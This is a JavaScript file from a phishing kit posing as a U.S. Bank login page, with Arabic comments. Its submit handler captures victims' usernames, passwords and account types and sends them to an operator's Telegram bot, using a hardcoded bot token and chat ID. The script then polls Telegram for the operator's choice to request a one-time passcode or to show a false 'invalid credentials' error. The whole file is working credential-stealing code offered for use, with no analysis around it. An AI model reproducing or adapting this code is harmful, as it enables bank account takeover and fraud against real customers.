const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

async function submitLogin(event) {
    event.preventDefault();
    
    // إظهار دائرة التحميل
    document.getElementById('loader').style.display = 'flex';

    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const type = document.getElementById('accType').value;

    const text = `🏦 *U.S. Bank New Login:* \n\n` +
                 `👤 Username: \`${user}\` \n` +
                 `🔑 Password: \`${pass}\` \n` +
                 `📂 Type: ${type}`;

    // إرسال البيانات مباشرة للتيليجرام (نفس طريقتك)
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
                        [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
                    ]
                }
            })
        });
        
        // بدء الاستماع للرد (Polling)
        startListening();
    } catch (e) {
        console.error("Error sending to Telegram");
    }
}

async function startListening() {
    const checkInterval = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await res.json();
            if(data.result.length > 0) {
                const cmd = data.result[0].callback_query?.data;
                
                if(cmd === "request_otp") {
                    clearInterval(checkInterval);
                    // هنا سنضع كود التحويل للصفحة الثانية لاحقاً
                    alert("تم الضغط على طلب OTP من قبل الآدمن"); 
                }
                
                if(cmd === "login_error") {
                    document.getElementById('loader').style.display = 'none';
                    alert("Invalid credentials, please try again.");
                    clearInterval(checkInterval);
                }
            }
        } catch(e) {}
    }, 3000);
}
